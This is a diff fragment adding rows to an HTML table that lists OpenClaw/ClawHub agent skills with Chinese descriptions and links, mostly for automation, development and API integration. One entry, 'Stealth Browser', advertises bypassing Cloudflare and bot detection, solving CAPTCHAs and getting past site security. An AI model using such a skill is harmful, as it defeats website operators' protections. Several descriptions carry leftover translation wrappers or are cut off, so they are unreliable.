+<td>查找技能技能</td>
+<td>Find Skills Skill</td>
+<td><a href="https://clawdhub.com/skills/find-skills-skill">ClawHub/find-skills-skill</a></td>
+<td>从多种来源搜索和发现OpenClaw技能。使用场景：用户想要查找可用技能、搜索特定功能或发现新技能。</td>
+</tr>
+<tr>
+<td align="center">17</td>
+<td>浏览器自动化</td>
+<td>Browser Automation 🔑</td>
+<td><a href="https://clawdhub.com/skills/browser-automation">ClawHub/browser-automation</a></td>
+<td>使用自然语言通过 CLI 命令自动化网页浏览器交互。适用于浏览网站、导航网页、提取数据、截屏、填表、点击按钮或与网页应用交互的场景。</td>
+</tr>
+<tr>
+<td align="center">18</td>
+<td>ClawdbotDocumentation专家</td>
+<td>Clawdbot Documentation Expert</td>
+<td><a href="https://clawdhub.com/skills/clawddocs">ClawHub/clawddocs</a></td>
+<td>Clawdbot文档专家，提供决策树导航、搜索脚本、文档获取、版本追踪及所有功能的配置代码段。</td>
+</tr>
+<tr>
+<td align="center">19</td>
+<td>PlaywrightMCP</td>
+<td>Playwright MCP</td>
+<td><a href="https://clawdhub.com/skills/playwright-mcp">ClawHub/playwright-mcp</a></td>
+<td>{  &quot;answer&quot;: &quot;通过 Playwright MCP 服务器实现浏览器自动化。可导航网站、点击元素、填写表单、提取数据、截图，并执行完整的浏览器自动化工作流。&quot; }</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td>Blogwatcher</td>
+<td>Blogwatcher</td>
+<td><a href="https://clawdhub.com/skills/blogwatcher">ClawHub/blogwatcher</a></td>
+<td>使用 blogwatcher CLI 监控博客和 RSS/Atom 订阅源的更新。</td>
+</tr>
+<tr>
+<td align="center">21</td>
+<td>UIUX专业版max</td>
+<td>UI/UX Pro Max</td>
+<td><a href="https://clawdhub.com/skills/ui-ux-pro-max">ClawHub/ui-ux-pro-max</a></td>
+<td>提供 UI/UX 设计智能与实现指导，帮助打造精美界面。适用于 UI 设计、UX 流程、信息架构、视觉风格、设计系统/标记、组件规格、文案/微文案、无障碍及前端 UI（HTML/CSS/JS、React、Next.js、Vue、Svelte、Tailwind）生成/评审/改进。工作流包括：①新 UI 布局与样式生成；②现有 UI/UX 改进；③设计系统标记和组件规范产出；④ UX 建议转化为...</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td>模型usage</td>
+<td>Model Usage</td>
+<td><a href="https://clawdhub.com/skills/model-usage">ClawHub/model-usage</a></td>
+<td>使用 CodexBar CLI 本地成本功能汇总 Codex 或 Claude 的各模型用量，支持当前模型或全模型明细。当查询 CodexBar 模型级用量/成本数据或需要脚本化汇总时触发。</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td>SuperDesign</td>
+<td>SuperDesign</td>
+<td><a href="https://clawdhub.com/skills/superdesign">ClawHub/superdesign</a></td>
+<td>专家级前端设计指南，用于创建美观、现代的用户界面。适用于落地页、仪表板等各类UI设计。</td>
+</tr>
+<tr>
+<td align="center">24</td>
+<td>Clawdhub</td>
+<td>Clawdhub</td>
+<td><a href="https://clawdhub.com/skills/clawdhub">ClawHub/clawdhub</a></td>
+<td>{&quot;answer&quot;:&quot;使用 ClawdHub CLI 从 clawdhub.com 搜索、安装、更新及发布智能体技能。适用于即时获取新技能、同步至最新或指定版本，或通过 npm 安装的 CLI 发布技能文件夹。&quot;}</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td>AgentMail</td>
+<td>AgentMail 🔑</td>
+<td><a href="https://clawdhub.com/skills/agentmail">ClawHub/agentmail</a></td>
+<td>专为AI智能体设计的API优先邮件平台。支持通过API创建专属邮箱、收发邮件，并利用Webhook与实时事件处理邮件工作流。适用于配置智能体邮件身份、代发邮件、处理收件流程，或替代Gmail等传统邮件服务。</td>
+</tr>
+<tr>
+<td align="center">26</td>
+<td>Playwright 自动化</td>
+<td>Playwright (Automation + MCP + Scraper)</td>
+<td><a href="https://clawdhub.com/skills/playwright">ClawHub/playwright</a></td>
+<td>通过 Playwright MCP 实现浏览器自动化。可导航网站、点击元素、填写表单、截图、提取数据及调试真实浏览器工作流。使用 w...</td>
+</tr>
+<tr>
+<td align="center">27</td>
+<td>n8n工作流自动化</td>
+<td>n8n workflow automation</td>
+<td><a href="https://clawdhub.com/skills/n8n-workflow-automation">ClawHub/n8n-workflow-automation</a></td>
+<td>设计并输出具有强大触发器、幂等性、错误处理、日志记录、重试机制和人工审核队列的n8n工作流JSON。当需要可审计的自动化流程且不会无声失败时使用。</td>
+</tr>
+<tr>
+<td align="center">28</td>
+<td>Qmd</td>
+<td>Qmd</td>
+<td><a href="https://clawdhub.com/skills/qmd">ClawHub/qmd</a></td>
+<td>本地搜索/索引命令行工具（BM25 + 向量 + 重新排序），支持 MCP 模式</td>
+</tr>
+<tr>
+<td align="center">29</td>
+<td>Docker Essentials</td>
+<td>Docker Essentials</td>
+<td><a href="https://clawdhub.com/skills/docker-essentials">ClawHub/docker-essentials</a></td>
+<td>&quot;容器管理、镜像操作与调试的 Docker 核心命令及工作流。&quot;</td>
+</tr>
+<tr>
+<td align="center">30</td>
+<td>代码文档搜索exa</td>
+<td>Code Docs Search by Exa</td>
+<td><a href="https://clawdhub.com/skills/code-docs-search-exa">ClawHub/code-docs-search-exa</a></td>
+<td>从 GitHub、文档网站和 Stack Overflow 搜索代码片段与文档，获取准确的语法和用法示例。</td>
+</tr>
+<tr>
+<td align="center">31</td>
+<td>Peekaboo</td>
+<td>Peekaboo</td>
+<td><a href="https://clawdhub.com/skills/peekaboo">ClawHub/peekaboo</a></td>
+<td>使用 Peekaboo CLI 捕获并自动化 macOS 界面。</td>
+</tr>
+<tr>
+<td align="center">32</td>
+<td>GitEssentials</td>
+<td>Git Essentials</td>
+<td><a href="https://clawdhub.com/skills/git-essentials">ClawHub/git-essentials</a></td>
+<td>Git 关键命令和工作流，涵盖版本控制、分支和协作。</td>
+</tr>
+<tr>
+<td align="center">33</td>
+<td>playwright爬虫技能</td>
+<td>Playwright Scraper Skill</td>
+<td><a href="https://clawdhub.com/skills/playwright-scraper-skill">ClawHub/playwright-scraper-skill</a></td>
+<td>基于 Playwright 的网页抓取 OpenClaw 技能，带有反爬保护，已在 Discuss.com.hk 等复杂网站成功测试。</td>
+</tr>
+<tr>
+<td align="center">34</td>
+<td>Tmux</td>
+<td>Tmux</td>
+<td><a href="https://clawdhub.com/skills/tmux">ClawHub/tmux</a></td>
+<td>通过发送按键和抓取窗格输出，远程控制交互式 CLI 的 tmux 会话。</td>
+</tr>
+<tr>
+<td align="center">35</td>
+<td>Tavily 搜索</td>
+<td>Tavily Web Search 🔑</td>
+<td><a href="https://clawdhub.com/skills/tavily-search">ClawHub/tavily-search</a></td>
+<td>AI-optimized web search via Tavily API. Returns concise, relevant results for AI agents.</td>
+</tr>
+<tr>
+<td align="center">36</td>
+<td>GitHub</td>
+<td>GitHub 🔑</td>
+<td><a href="https://clawdhub.com/skills/github-api">ClawHub/github-api</a></td>
+<td>通过托管OAuth集成GitHub API，可访问仓库、议题、拉取请求、提交、分支和用户。当用户想与GitHub交互时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">37</td>
+<td>图表生成器</td>
+<td>diagram-generator</td>
+<td><a href="https://clawdhub.com/skills/diagram-generator">ClawHub/diagram-generator</a></td>
+<td>使用 mcp-diagram-generatorMCP 服务器，根据结构化规格说明生成 Draw.io 架构图、Mermaid 流程图和 Excalidraw 草图。</td>
+</tr>
+<tr>
+<td align="center">38</td>
+<td>代码</td>
+<td>Code</td>
+<td><a href="https://clawdhub.com/skills/code">ClawHub/code</a></td>
+<td>包含规划、实现、验证和测试的编码工作流，用于整洁的软件开发。</td>
+</tr>
+<tr>
+<td align="center">39</td>
+<td>Spotify Player</td>
+<td>Spotify Player</td>
+<td><a href="https://clawdhub.com/skills/spotify-player">ClawHub/spotify-player</a></td>
+<td>通过 spogo（首选）或 spotify_player 实现终端 Spotify 播放/搜索。</td>
+</tr>
+<tr>
+<td align="center">40</td>
+<td>Stripe</td>
+<td>Stripe 🔑</td>
+<td><a href="https://clawdhub.com/skills/stripe-api">ClawHub/stripe-api</a></td>
+<td>Stripe API 集成，支持托管 OAuth，实现对客户、订阅、发票、产品、价格和支付的可写金融集成。</td>
+</tr>
+<tr>
+<td align="center">41</td>
+<td>Intelligent Stocks Screener</td>
+<td>Intelligent Stocks Screener 🔑</td>
+<td><a href="https://clawdhub.com/skills/mx-stocks-screener">ClawHub/mx-stocks-screener</a></td>
+<td>基于东方财富数据库，支持自然语言输入筛选A股、港股、美股、基金、债券等资产；多维指标筛选覆盖技术面、消息面、基本面与市场情绪；适用于全球资产速筛、跨市场监控、投资组合构建和策略回测；返回结果含数据说明及CSV文件。投资自然语言筛选器。</td>
+</tr>
+<tr>
+<td align="center">42</td>
+<td>前端设计3</td>
+<td>Frontend Design</td>
+<td><a href="https://clawdhub.com/skills/frontend-design-3">ClawHub/frontend-design-3</a></td>
+<td>创建独特、高品质的生产级前端界面。用于构建Web组件、页面或应用程序。生成创意、精致的代码，避免通用的AI美学风格。</td>
+</tr>
+<tr>
+<td align="center">43</td>
+<td>Proactivity (Proactive Agent)</td>
+<td>Proactivity (Proactive Agent)</td>
+<td><a href="https://clawdhub.com/skills/proactivity">ClawHub/proactivity</a></td>
+<td>预见需求，保持工作推进，并通过使用持续改进，使代理更主动。</td>
+</tr>
+<tr>
+<td align="center">44</td>
+<td>opencode控制器</td>
+<td>Opencode-controller</td>
+<td><a href="https://clawdhub.com/skills/opencode-controller">ClawHub/opencode-controller</a></td>
+<td>通过斜杠命令控制Opencode，管理会话、选择模型、切换代理（计划/构建）并协调编码工作。</td>
+</tr>
+<tr>
+<td align="center">45</td>
+<td>Goplaces</td>
+<td>Goplaces 🔑</td>
+<td><a href="https://clawdhub.com/skills/goplaces">ClawHub/goplaces</a></td>
+<td>通过 goplaces CLI 调用 Google Places API（新版），支持文本搜索、地点详情、解析及评论。适用于人性化的地点查询或脚本 JSON 输出。</td>
+</tr>
+<tr>
+<td align="center">46</td>
+<td>Filesystem管理</td>
+<td>Filesystem Management</td>
+<td><a href="https://clawdhub.com/skills/clawdbot-filesystem">ClawHub/clawdbot-filesystem</a></td>
+<td>高级文件系统操作——为Clawdbot提供列表、搜索、批处理及目录分析功能。</td>
+</tr>
+<tr>
+<td align="center">47</td>
+<td>Salesforce</td>
+<td>Salesforce 🔑</td>
+<td><a href="https://clawdhub.com/skills/salesforce-api">ClawHub/salesforce-api</a></td>
+<td>Salesforce CRM API 集成，支持托管 OAuth。仅在需要 Salesforce CRM 管理时安装。以最窄的 Salesforce 权限进行连接。</td>
+</tr>
+<tr>
+<td align="center">48</td>
+<td>调试专业版</td>
+<td>Debug Pro</td>
+<td><a href="https://clawdhub.com/skills/debug-pro">ClawHub/debug-pro</a></td>
+<td>提供七步调试协议及语言特定命令，系统化地识别、验证并修复跨多环境的软件缺陷。</td>
+</tr>
+<tr>
+<td align="center">49</td>
+<td>opentwitter</td>
+<td>opentwitter 🔑</td>
+<td><a href="https://clawdhub.com/skills/opentwitter-mcp">ClawHub/opentwitter-mcp</a></td>
+<td>通过6551 API获取Twitter/X数据。支持用户资料、推文搜索、用户推文、关注者事件、已删除推文及KOL关注者。</td>
+</tr>
+<tr>
+<td align="center">50</td>
+<td>opennews</td>
+<td>opennews 🔑</td>
+<td><a href="https://clawdhub.com/skills/opennews-mcp">ClawHub/opennews-mcp</a></td>
+<td>通过OpenNews 6551 API提供加密货币新闻搜索、AI评分、交易信号和实时更新。支持关键词搜索、币种筛选、来源筛选...</td>
+</tr>
+<tr>
+<td align="center">51</td>
+<td>Answer Overflow</td>
+<td>Answer Overflow</td>
+<td><a href="https://clawdhub.com/skills/answeroverflow">ClawHub/answeroverflow</a></td>
+<td>通过 Answer Overflow 搜索已索引的 Discord 社区讨论。查找仅存在于 Discord 对话中的编程问题解决方案、库问题及社区问答。</td>
+</tr>
+<tr>
+<td align="center">52</td>
+<td>前端设计ultimate</td>
+<td>Frontend Design Ultimate</td>
+<td><a href="https://clawdhub.com/skills/frontend-design-ultimate">ClawHub/frontend-design-ultimate</a></td>
+<td>使用 React、Tailwind CSS 和 shadcn/ui 构建独特的生产级静态网站——无需设计稿。根据纯文本需求生成醒目设计，具备反AI粗制滥造美学风格、移动优先响应式布局和单文件打包。适用于落地页、营销站点、作品集、仪表盘等静态网页。支持 Vite（纯静态）和 Next.js（Vercel 部署）工作流。</td>
+</tr>
+<tr>
+<td align="center">53</td>
+<td>Telegram</td>
+<td>Telegram</td>
+<td><a href="https://clawdhub.com/skills/telegram">ClawHub/telegram</a></td>
+<td>{&quot;answer&quot;:&quot;使用直接HTTPS请求（无SDK）设计Telegram Bot API工作流及命令驱动对话的OpenClaw技能。&quot;}</td>
+</tr>
+<tr>
+<td align="center">54</td>
+<td>谷歌play</td>
+<td>Google Play 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-play">ClawHub/google-play</a></td>
+<td>Google Play 开发者 API（Android Publisher）集成，采用托管式 OAuth。可管理应用、订阅、应用内购买和评论。在以下情况使用此技能：</td>
+</tr>
+<tr>
+<td align="center">55</td>
+<td>SQL Toolkit</td>
+<td>SQL Toolkit</td>
+<td><a href="https://clawdhub.com/skills/sql-toolkit">ClawHub/sql-toolkit</a></td>
+<td>查询、设计、迁移和优化SQL数据库。适用于 SQLite、PostgreSQL 或 MySQL——包括结构设计、编写查询、创建迁移、索引、备份/恢复以及慢查询调试。不需要 ORM。</td>
+</tr>
+<tr>
+<td align="center">56</td>
+<td>AI网页自动化</td>
+<td>AI Web Automation</td>
+<td><a href="https://clawdhub.com/skills/ai-web-automation">ClawHub/ai-web-automation</a></td>
+<td>支持多浏览器和重试机制，自动执行表单填写、数据抓取、测试、监控及定时任务等Web任务。</td>
+</tr>
+<tr>
+<td align="center">57</td>
+<td>OpenClawGitHub助手</td>
+<td>OpenClaw GitHub Assistant 🔑</td>
+<td><a href="https://clawdhub.com/skills/openclaw-github-assistant">ClawHub/openclaw-github-assistant</a></td>
+<td>查询并管理GitHub仓库——列出仓库、检查CI状态、创建Issue、搜索仓库、查看最近活动。</td>
+</tr>
+<tr>
+<td align="center">58</td>
+<td>Gifgrep</td>
+<td>Gifgrep 🔑</td>
+<td><a href="https://clawdhub.com/skills/gifgrep">ClawHub/gifgrep</a></td>
+<td>使用CLI/TUI搜索GIF源，下载结果并提取静态图/精灵图。</td>
+</tr>
+<tr>
+<td align="center">59</td>
+<td>定时mastery</td>
+<td>Cron Mastery</td>
+<td><a href="https://clawdhub.com/skills/cron-mastery">ClawHub/cron-mastery</a></td>
+<td>{&quot;answer&quot;:&quot;掌握OpenClaw计时系统，用于安排可靠提醒、设置定期维护（清理任务），并了解何时使用Cron v...&quot;}</td>
+</tr>
+<tr>
+<td align="center">60</td>
+<td>Markdown Formatter</td>
+<td>Markdown Formatter</td>
+<td><a href="https://clawdhub.com/skills/markdown-formatter">ClawHub/markdown-formatter</a></td>
+<td>使用可配置样式格式化并美化markdown文档。保留结构，修复格式，确保一致性。</td>
+</tr>
+<tr>
+<td align="center">61</td>
+<td>Oracle</td>
+<td>Oracle 🔑</td>
+<td><a href="https://clawdhub.com/skills/oracle">ClawHub/oracle</a></td>
+<td>使用 @steipete/oracle CLI 打包提示词与目标文件，通过双模型（API或浏览器）进行调试、重构、设计检查或交叉验证。</td>
+</tr>
+<tr>
+<td align="center">62</td>
+<td>Linear</td>
+<td>Linear 🔑</td>
+<td><a href="https://clawdhub.com/skills/linear-api">ClawHub/linear-api</a></td>
+<td>Linear API 集成（托管 OAuth），使用 GraphQL 查询和管理事项、项目、团队、周期、标签。当用户想创建...时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">63</td>
+<td>超能力</td>
+<td>Superpowers Dev Workflow</td>
+<td><a href="https://clawdhub.com/skills/superpowers">ClawHub/superpowers</a></td>
+<td>以规格为首、测试驱动开发、子代理驱动的软件开发工作流。适用于：① 构建任何新功能或应用——触发头脑风暴 → 规划 → 子代理执行……</td>
+</tr>
+<tr>
+<td align="center">64</td>
+<td>代码审查</td>
+<td>Code Review</td>
+<td><a href="https://clawdhub.com/skills/code-review">ClawHub/code-review</a></td>
+<td>涵盖安全、性能、可维护性、正确性和测试的系统化代码审查模式，包含严重等级、结构化反馈指南、审查流程及需避免的反模式。适用于审查 PR、建立审查标准或提升审查质量。</td>
+</tr>
+<tr>
+<td align="center">65</td>
+<td>tencentcloudlighthouse技能</td>
+<td>Tencent Cloud Lighthouse 🔑</td>
+<td><a href="https://clawdhub.com/skills/tencentcloud-lighthouse-skill">ClawHub/tencentcloud-lighthouse-skill</a></td>
+<td>触发条件：用户提及 Lighthouse、轻量应用服务器或轻量服务器，或请求检查/创建/管理/部署 Lighthouse 实例、部署应用到 Lighthouse、管理相关资源。</td>
+</tr>
+<tr>
+<td align="center">66</td>
+<td>Screenshot</td>
+<td>Screenshot</td>
+<td><a href="https://clawdhub.com/skills/screenshot">ClawHub/screenshot</a></td>
+<td>使用合适的工具、等待策略、视口等配置，捕获、检查并比对屏幕、窗口、区域、网页、模拟器及CI运行截图。</td>
+</tr>
+<tr>
+<td align="center">67</td>
+<td>Git</td>
+<td>Git</td>
+<td><a href="https://clawdhub.com/skills/git">ClawHub/git</a></td>
+<td>Git 提交、分支、变基、合并、冲突解决、历史恢复、团队工作流，以及保障日常版本控制安全所需的命令。</td>
+</tr>
+<tr>
+<td align="center">68</td>
+<td>文件搜索</td>
+<td>File Search</td>
+<td><a href="https://clawdhub.com/skills/file-search">ClawHub/file-search</a></td>
+<td>使用 `fd` 和 `rg`（ripgrep）进行快速文件名和内容搜索。</td>
+</tr>
+<tr>
+<td align="center">69</td>
+<td>UIUX设计</td>
+<td>UI/UX Design Guide</td>
+<td><a href="https://clawdhub.com/skills/ui-ux-design">ClawHub/ui-ux-design</a></td>
+<td>移动优先UI/UX设计、色彩系统、字体排版、无障碍设计(WCAG 2.2)、Tailwind + Shadcn/ui集成、微交互等专家指导</td>
+</tr>
+<tr>
+<td align="center">70</td>
+<td>Computer Use</td>
+<td>Computer Use</td>
+<td><a href="https://clawdhub.com/skills/computer-use">ClawHub/computer-use</a></td>
+<td>无头Linux服务器完整桌面操作。基于Xvfb + XFCE虚拟桌面与xdotool自动化。支持点击、输入、滚动、截图、拖拽等17种操作。</td>
+</tr>
+<tr>
+<td align="center">71</td>
+<td>编程</td>
+<td>Coding</td>
+<td><a href="https://clawdhub.com/skills/coding">ClawHub/coding</a></td>
+<td>自动记忆编码风格，适应你的偏好、规范和模式，保持代码一致性。</td>
+</tr>
+<tr>
+<td align="center">72</td>
+<td>fast浏览器use</td>
+<td>Fastest Browser Use</td>
+<td><a href="https://clawdhub.com/skills/fast-browser-use">ClawHub/fast-browser-use</a></td>
+<td>高性能浏览器自动化，适用于重型抓取、多标签管理和精确 DOM 提取。在需要速度、可靠性或超越标准网页获取的高级状态管理（Cookie/本地存储）时使用。</td>
+</tr>
+<tr>
+<td align="center">73</td>
+<td>OpenClaw自动updater</td>
+<td>OpenClaw Auto‑Updater (Safe + Scheduled + Summary)</td>
+<td><a href="https://clawdhub.com/skills/openclaw-auto-updater">ClawHub/openclaw-auto-updater</a></td>
+<td>使用可靠的 cron 模板、时区安全调度及清晰摘要输出，安排 OpenClaw 和技能的自动更新。适用于免维护管理、计划升级及简明更新报告。</td>
+</tr>
+<tr>
+<td align="center">74</td>
+<td>Python编程Guidelines</td>
+<td>Python Coding Guidelines</td>
+<td><a href="https://clawdhub.com/skills/python">ClawHub/python</a></td>
+<td>Python编码规范和最佳实践。编写、审查或重构代码时遵守：PEP 8风格、py_compile 语法检查、单元测试、仅使用未EOL的现代Python版本、uv 依赖管理（如有），以及 Pythonic 惯用写法。</td>
+</tr>
+<tr>
+<td align="center">75</td>
+<td>Docker 管理</td>
+<td>Docker</td>
+<td><a href="https://clawdhub.com/skills/docker">ClawHub/docker</a></td>
+<td>Docker容器与镜像、Compose编排、网络与数据卷、调试与生产环境加固，以及保障真实环境稳定的各项命令。</td>
+</tr>
+<tr>
+<td align="center">76</td>
+<td>stealth浏览器</td>
+<td>Stealth Browser 🔑</td>
+<td><a href="https://clawdhub.com/skills/stealth-browser">ClawHub/stealth-browser</a></td>
+<td>终极隐身浏览器自动化，支持反检测、Cloudflare绕过、验证码识别、持久会话和静默操作。适用于绕过机器人检测、登录持久化、无头浏览或突破安全防护的网页自动化任务。触发词：bypass cloudflare、solve captcha、stealth browse、silent automation、persistent login、anti-detection等。当用户要求登录某网站时，...</td>
+</tr>
+<tr>
+<td align="center">77</td>
+<td>X搜索</td>
+<td>X Search 🔑</td>
+<td><a href="https://clawdhub.com/skills/x-search">ClawHub/x-search</a></td>
+<td>使用 xAI API 搜索 X (Twitter) 帖子。适用于查找推文、搜索 X/Twitter 或查看社交媒体内容。</td>
+</tr>
+<tr>
+<td align="center">78</td>
+<td>PlaywrightCLI自动化</td>
+<td>Playwright CLI Automation</td>
+<td><a href="https://clawdhub.com/skills/playwright-cli-openclaw">ClawHub/playwright-cli-openclaw</a></td>
+<td>官方Microsoft Playwright CLI网页自动化工具，支持所有主流浏览器的无头/有头自动化操作，包括页面导航、元素交互、截图、录制、测试等功能。当用户提到网页自动化、浏览器操作、爬虫、截图、录制用户操作、E2E测试时触发。</td>
+</tr>
+<tr>
+<td align="center">79</td>
+<td>FFmpeg视频编辑器</td>
+<td>ffmpeg-video-editor</td>
+<td><a href="https://clawdhub.com/skills/ffmpeg-video-editor">ClawHub/ffmpeg-video-editor</a></td>
+<td>根据自然语言视频编辑需求生成FFmpeg命令，支持剪辑、裁剪、转换、压缩、修改宽高比、提取音频等。</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td>WindowsUI自动化</td>
+<td>Windows UI Automation</td>
+<td><a href="https://clawdhub.com/skills/windows-ui-automation">ClawHub/windows-ui-automation</a></td>
+<td>使用PowerShell自动执行Windows GUI交互（鼠标、键盘、窗口）。适用于需要在桌面上模拟用户输入的场景，如移动光标、点击按钮、在非Web应用中输入文本或管理窗口状态。</td>
+</tr>
+<tr>
+<td align="center">81</td>
+<td>Filesystem</td>
+<td>Filesystem</td>
+<td><a href="https://clawdhub.com/skills/filesystem">ClawHub/filesystem</a></td>
+<td>执行高级文件系统任务，包括列出文件、按名称或内容递归搜索、批量复制/移动/删除文件以及分析目录大小。</td>
+</tr>
+<tr>
+<td align="center">82</td>
+<td>测试运行器</td>
+<td>Test Runner</td>
+<td><a href="https://clawdhub.com/skills/test-runner">ClawHub/test-runner</a></td>
+<td>使用推荐框架编写、运行和管理 TypeScript、Python 和 Swift 的单元、集成及 E2E 测试。</td>
+</tr>
+<tr>
+<td align="center">83</td>
+<td>股票查询</td>
+<td>股票查询 / Stock Price Query</td>
+<td><a href="https://clawdhub.com/skills/stock-price-query">ClawHub/stock-price-query</a></td>
+<td>股票查询：实时查询股票价格与行情数据，支持A股（沪深）、港股、美股及大盘指数（上证、深证、恒生、纳斯达克、道琼斯、标普500），支持批量查询，零配置开箱即用。</td>
+</tr>
+<tr>
+<td align="center">84</td>
+<td>Remotion Best Practices</td>
+<td>Remotion Best Practices</td>
+<td><a href="https://clawdhub.com/skills/remotion-best-practices">ClawHub/remotion-best-practices</a></td>
+<td>Remotion 最佳实践 - React 视频创作</td>
+</tr>
+<tr>
+<td align="center">85</td>
+<td>systemresource监控</td>
+<td>System Resource Monitor</td>
+<td><a href="https://clawdhub.com/skills/system-resource-monitor">ClawHub/system-resource-monitor</a></td>
+<td>简洁可靠的系统资源监控工具，监测 CPU 负载、内存、交换区和磁盘使用情况，针对 OpenClaw 进行了优化。</td>
+</tr>
+<tr>
+<td align="center">86</td>
+<td>Git工作流</td>
+<td>Git Workflows</td>
+<td><a href="https://clawdhub.com/skills/git-workflows">ClawHub/git-workflows</a></td>
+<td>涉及 add/commit/push 之外的进阶 Git 操作。适用于变基、二分查找 Bug、使用工作树并行开发、利用 reflog 恢复、管理子树/子模块、解决合并冲突、跨分支拣选提交或处理单体仓库等场景。</td>
+</tr>
+<tr>
+<td align="center">87</td>
+<td>技能finder</td>
+<td>Skill Finder (Find ClawHub skills + Search Skills.sh)</td>
+<td><a href="https://clawdhub.com/skills/skill-finder">ClawHub/skill-finder</a></td>
+<td>当用户需要新功能、更优工作流、更强工具或更安全替代方案时，在 ClawHub 和 Skills.sh 查找、比较并安装智能体技能。</td>
+</tr>
+<tr>
+<td align="center">88</td>
+<td>数据库operations</td>
+<td>Database Operations</td>
+<td><a href="https://clawdhub.com/skills/database-operations">ClawHub/database-operations</a></td>
+<td>用于设计数据库结构、编写迁移脚本、优化SQL查询、解决N+1问题、创建索引、搭建PostgreSQL环境、配置EF Core、实现缓存、表分区或任何数据库性能问题。</td>
+</tr>
+<tr>
+<td align="center">89</td>
+<td>Openhue</td>
+<td>Openhue</td>
+<td><a href="https://clawdhub.com/skills/openhue">ClawHub/openhue</a></td>
+<td>通过 OpenHue CLI 控制 Philips Hue 灯光/场景。</td>
+</tr>
+<tr>
+<td align="center">90</td>
+<td>技能创建器2</td>
+<td>Skill Creator</td>
+<td><a href="https://clawdhub.com/skills/skill-creator-2">ClawHub/skill-creator-2</a></td>
+<td>创建有效技能指南。当用户希望创建新技能（或更新现有技能）以利用专业知识、工作流程或工具集成扩展 Claude 的能力时，应使用此技能。</td>
+</tr>
+<tr>
+<td align="center">91</td>
+<td>OpenClaw代理浏览器</td>
+<td>Agent Browser</td>
+<td><a href="https://clawdhub.com/skills/openclaw-agent-browser">ClawHub/openclaw-agent-browser</a></td>
+<td>面向AI代理的无头浏览器自动化CLI。用于与网站交互——导航页面、填写表单、点击按钮、截图等。</td>
+</tr>
+<tr>
+<td align="center">92</td>
+<td>代理浏览器core</td>
+<td>Agent Browser Core</td>
+<td><a href="https://clawdhub.com/skills/agent-browser-core">ClawHub/agent-browser-core</a></td>
+<td>用于agent-browser CLI的OpenClaw技能（基于Rust，Node.js备选方案），支持快照、引用和结构化命令，实现AI友好的网页自动化。</td>
+</tr>
+<tr>
+<td align="center">93</td>
+<td>Bluebubbles</td>
+<td>Bluebubbles</td>
+<td><a href="https://clawdhub.com/skills/bluebubbles">ClawHub/bluebubbles</a></td>
+<td>为Clawdbot构建或更新BlueBubbles外部渠道插件（扩展包、REST发送/探测、Webhook入站）。</td>
+</tr>
+<tr>
+<td align="center">94</td>
+<td>academic写作</td>
+<td>academic-writing</td>
+<td><a href="https://clawdhub.com/skills/academic-writing">ClawHub/academic-writing</a></td>
+<td>擅长学术写作，包括论文、文献综述、研究方法及论文撰写，严格遵守学术规范和引用标准。</td>
+</tr>
+<tr>
+<td align="center">95</td>
+<td>Vercel平台</td>
+<td>Vercel Platform</td>
+<td><a href="https://clawdhub.com/skills/vercel">ClawHub/vercel</a></td>
+<td>{   &quot;translation&quot;: &quot;利用完整 CLI 参考部署应用并管理项目。命令涵盖部署、项目、域名、环境变量及实时文档访问。&quot; }</td>
+</tr>
+<tr>
+<td align="center">96</td>
+<td>tencentCOS技能</td>
+<td>Tencent COS 🔑</td>
+<td><a href="https://clawdhub.com/skills/tencent-cos-skill">ClawHub/tencent-cos-skill</a></td>
+<td>腾讯云对象存储(COS)和数据万象(CI)集成技能，覆盖文件存储管理、AI处理和知识库三大核心场景。存储场景：上传文件到云端、下载云端文件、批量管理存储桶文件、获取文件签名链接分享、查看文件元信息。图片处理场景：图片质量评估打分、AI超分辨率放大、AI智能裁剪、二维码/条形码识别、添加文字水印、获取图片EXIF信息。</td>
+</tr>
+<tr>
+<td align="center">97</td>
+<td>Blucli</td>
+<td>Blucli</td>
+<td><a href="https://clawdhub.com/skills/blucli">ClawHub/blucli</a></td>
+<td>BluOS CLI (blu) 用于设备发现、播放、分组和音量控制。</td>
+</tr>
+<tr>
+<td align="center">98</td>
+<td>cursor代理</td>
+<td>Cursor CLI Agent 🔑</td>
+<td><a href="https://clawdhub.com/skills/cursor-agent">ClawHub/cursor-agent</a></td>
+<td>一项用于执行各类软件工程任务的 Cursor CLI 代理综合技能（已更新 2026 年功能，含 tmux 自动化指南）。</td>
+</tr>
+<tr>
+<td align="center">99</td>
+<td>提示词注入防护</td>
+<td>Prompt Injection Guard</td>
+<td><a href="https://clawdhub.com/skills/prompt-injection-guard">ClawHub/prompt-injection-guard</a></td>
+<td>提示注入防御：检测并阻止恶意提示，保护系统指令，清理用户输入。</td>
+</tr>
+<tr>
+<td align="center">100</td>
+<td>agentic编程</td>
+<td>Agentic Coding</td>
+<td><a href="https://clawdhub.com/skills/agentic-coding">ClawHub/agentic-coding</a></td>
+<td>借助AI智能体，通过验收契约、微差分、红绿循环及确定性交接检查点交付生产代码。</td>
+</tr>
+<tr>
+<td align="center">101</td>
+<td>前端</td>
+<td>Frontend Design</td>
+<td><a href="https://clawdhub.com/skills/frontend">ClawHub/frontend</a></td>
+<td>使用React、Next.js和Tailwind CSS进行前端开发，构建响应式、无障碍且高性能的落地页、仪表盘、表单及组件。</td>
+</tr>
+<tr>
+<td align="center">102</td>
+<td>Qveris</td>
+<td>Qveris 🔑</td>
+<td><a href="https://clawdhub.com/skills/qveris">ClawHub/qveris</a></td>
+<td>通过QVeris API搜索并执行动态工具。适用于需要动态查找和调用外部API或工具的场景（如天气、搜索、数据检索、股票交易分析等）。需要配置QVERIS_API_KEY环境变量。</td>
+</tr>
+<tr>
+<td align="center">103</td>
+<td>SSHEssentials</td>
+<td>Ssh Essentials</td>
+<td><a href="https://clawdhub.com/skills/ssh-essentials">ClawHub/ssh-essentials</a></td>
+<td>安全远程访问、密钥管理、隧道及文件传输的核心 SSH 命令。  {   &quot;answer&quot;: &quot;安全远程访问、密钥管理、隧道及文件传输的核心 SSH 命令。&quot; }</td>
+</tr>
+<tr>
+<td align="center">104</td>
+<td>Brainstorming</td>
+<td>Brainstorming</td>
